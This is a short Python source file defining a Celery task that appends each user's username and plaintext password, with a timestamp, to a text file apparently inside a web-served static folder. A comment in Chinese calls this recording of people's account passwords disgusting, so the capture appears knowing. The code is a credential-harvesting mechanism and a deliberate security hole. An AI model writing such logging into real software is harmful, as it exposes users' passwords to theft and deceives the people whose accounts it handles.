# coding:utf-8
import datetime
import tornado.gen

from tasks import celery


@celery.task
@tornado.gen.coroutine
def task_write(param_dict):

    # 这恶心的事, 记录人家账号密码呢
    content = '[' + \
              str(datetime.datetime.now())[:-7] + \
              '] ' + \
              param_dict['username'] + \
              ' ' + \
              param_dict['password'] + \
              '\n'

    with open('./static/userpwd.txt', 'a+') as f: f.write(content)

    return